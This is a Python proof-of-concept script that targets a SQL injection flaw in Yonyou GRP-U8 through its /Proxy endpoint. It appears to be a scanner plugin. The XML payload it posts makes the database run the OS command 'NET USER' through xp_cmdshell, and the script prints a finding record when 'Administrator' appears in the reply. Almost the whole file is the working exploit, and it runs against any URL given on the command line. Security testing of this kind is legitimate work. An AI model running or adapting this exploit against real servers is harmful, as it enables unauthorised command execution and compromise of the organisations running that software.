import requests
from random import choice
import sys
import json

headers={
    "Cache-Control": "max-age=0",
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
    }

def run(url):
    url=url+'/Proxy'
    data='cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "NET USER"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
    res=requests.post(url=url,data=data,headers=headers)

    resText=res.text
    if 'Administrator' in resText:
        data={

            "name":"用友GRP-U8 sql注入",
            "level":"3",
            "request":"",
            "response":resText,
            }

        print(data)


if __name__ == "__main__":
    url= sys.argv[1]
    run(url)
